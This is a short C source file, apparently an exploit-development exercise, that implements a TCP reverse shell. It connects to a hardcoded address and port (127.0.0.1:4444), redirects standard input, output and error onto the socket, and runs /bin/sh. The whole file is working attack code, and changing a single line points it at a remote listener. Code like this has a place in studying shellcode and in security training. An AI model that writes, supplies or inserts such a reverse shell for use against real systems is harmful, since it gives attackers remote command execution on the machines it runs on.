/*
 * tcp_reverse_shellcode.c: connects to a given IP address and TCP port and
 * spawn a shell when connection succeeded.
 *
 * BSD 2-Clause License
 *
 * Copyright (c) 2018, Paolo Perego
 * All rights reserved.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

// for socket() and connect() calls
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define IP 	"127.0.0.1"
#define DPORT	4444

int main(int argc, char **argv) {
	int sfd, ret;
	struct sockaddr_in peer;


	memset(&peer, 0, sizeof(struct sockaddr));

	peer.sin_family 	= AF_INET;
	peer.sin_port 	= htons(DPORT); 
	peer.sin_addr.s_addr = inet_addr(IP); 

	sfd = socket(AF_INET, SOCK_STREAM, 0);
	ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));

	if ( ret == 0 ) {
		dup2(sfd, 0);
		dup2(sfd, 1);
		dup2(sfd, 2);
		execve((const char *)"/bin/sh", NULL, NULL);
		return 0;
	} 

	return -ret;
}
